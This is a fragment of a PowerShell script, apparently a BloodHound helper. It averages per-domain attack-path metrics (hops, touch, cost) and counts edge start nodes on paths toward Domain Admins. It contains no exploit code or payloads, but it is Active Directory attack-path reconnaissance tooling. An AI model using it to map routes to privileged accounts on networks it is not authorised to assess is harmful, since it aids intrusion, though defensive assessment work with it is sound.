        $Null=$Collect.add($Obj)
        }}
    End{
        foreach($Dom in ($Collect.Domain|Sort -unique)){
            foreach($Dir in 'Inbound','Outbound'){
                $x = $Collect | where Domain -eq $Dom |Where Direction -eq $Dir
                if($X){
                    [Wald0IO]@{
                        Domain     = $Dom
                        Type       = $x.Type[0]
                        Total      = $x.Total[0]
                        Direction  = $Dir                   
                        Count      = [Math]::Round(($x | Measure-Object -Property Count   -average).Average,2)
                        Percent    = [Math]::Round(($x | Measure-Object -Property Percent -average).Average,2)
                        Hop        = [Math]::Round(($x | Measure-Object -Property Hop     -average).Average,2)
                        Touch      = [Math]::Round(($x | Measure-Object -Property Touch   -average).Average,2)
                        Cost       = [Math]::Round(($x | Measure-Object -Property Cost    -average).Average,2)
                        Target     = '+'
                        }}}}}}
#####################End


#endregion ################################################


###########################################################
###################################################### INIT
$ASCII
CacheNode

###########################################################
####################################################### EOF




<#
.Synopsis
   Measure-NodeWeight
.DESCRIPTION
   Measure NodeWeight - Experimental
.EXAMPLE
   Path User Group * 'DOMAIN ADMINS@DOMAIN.LOCAL' | Measure-NodeWeight
#>
Function Measure-NodeWeight{
    Param(
        [Parameter(Mandatory=1,ValueFromPipeline=1)][BHEdge[]]$Edge
        )
    Begin{[Collections.ArrayList]$T=@()}
    Process{Foreach($E in $Edge){$Null=$T.Add($E)}}
    End{$T|Group-Object StartNode -NoElement|Select Name,Count}
    }

